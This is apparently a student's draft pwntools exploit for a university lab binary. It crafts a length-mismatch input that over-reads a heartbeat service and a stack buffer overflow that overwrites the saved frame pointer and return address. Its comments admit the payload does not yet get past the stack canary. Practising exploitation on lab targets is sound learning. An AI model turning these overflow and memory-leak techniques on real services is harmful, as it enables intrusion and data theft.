#!/usr/bin/python3
# 2022.09.27.1803.EST
from pwn import *

with gdb.debug("./lab4-3.bin") as p:
#with remote("csc748.hostbin.org", 7043) as p:
    payload = b""
    #payload += b"A"*0x420

    ##payload += b"2048:"
    ##payload += b"A"*1024
    ##payload += b"\n"

    # [NOTE] The additional 16 bytes added to the end of the stack should be to ensure the stack is aligned properly?
    # This doesn't seem to make much sense though because it'd only have to be there to ensure 32 byte alignment
    # Maybe that's it? Because the two integers on the top of the stack take up 16 bytes... I dunno. Maybe?

    # Total stack size is 1024 + 8 + 8 = 1040
    # We need the next 16 bytes after that, or a total of 1056 bytes
    payload += b"1040:"
    #payload += b"A"*1024 + b"B"*8 + b"C"*8
    payload += b"A"*1024
    #payload += p64(0x12345678FFFFFFFF)
    #payload += p64(0x87654321EEEEEEEE)
    payload += b"\n"

    #banner = p.recv()
    #print(banner.decode("utf-8"))
    #banner = p.recv()
    #print(banner.decode("utf-8"))
    #banner = p.recv()
    #print(banner.decode("utf-8"))
    recv = p.recvuntil("Waiting for heart beat request...\n")
    print(recv)

    #p.send(payload)

    #recv = p.recv()
    #recv = p.recv(1024+8+8+16)
    #recv = p.recv(1024+8+8)
    #recv = p.recv(1024)
    #recv = p.recv(16)
    #recv = p.recv()
    #print(recv)

    #p.send(b"2048:" + b"A"*1023 + b"\n")
    #p.send(b"2048:" + b"A"*0x429 + b"\n")
    # Hopefully should be return value for main()
    payload = b""
    payload += b"2048:" + b"A"*1024    # Write until end of data[1024]
    payload += b"B"*32    # Overflow stack padding
    payload += p64(0x01234567)    # Overflow ebp
    payload += p64(0x89abcdef)    # Write where we want to jump to in memory. This does however fail the stack canary
    payload += b"\n"
    p.send(payload)
    #p.send(b"2048:" + b"A"*1024 + b"B"*32 + p64(0x12345678) + b"\n")
    #recv = p.recv(1024)
    print(recv)

    recv = p.recvuntil("Waiting for heart beat request...\n")
    print(recv)

    # Break out of the do loop
    p.send(b"0:BBBBBBBB" + b"\n")

    p.interactive()

"""
with gdb.debug("./lab4-3.bin") as p:
#with remote("csc748.hostbin.org", 7043) as p:
    #payload = b"1024" + b":" + b"A"*1024 + b"\n"
    #payload = b"64" + b":" + b"A"*64 + b"\n"
    #payload = b"2048" + b":" + b"A"*1024 + b"\n"
    payload = b"2048" + b":" + b"A"*16 + b"\n"

    banner = p.recv()
    #print(banner.decode("utf-8"))

    p.send(payload)

    response = p.recv()
    prompt_len = 31
    data = response[prompt_len:]    # Sending heart beat response...\n
    data = data[16:]    # Length of actual data sent
    end_len = 35
    data = data[:-end_len]    # \nWaiting for heart beat request...\n

    padding = b"\x00"*0
    data = padding + data

    print(data)

    p.interactive()
"""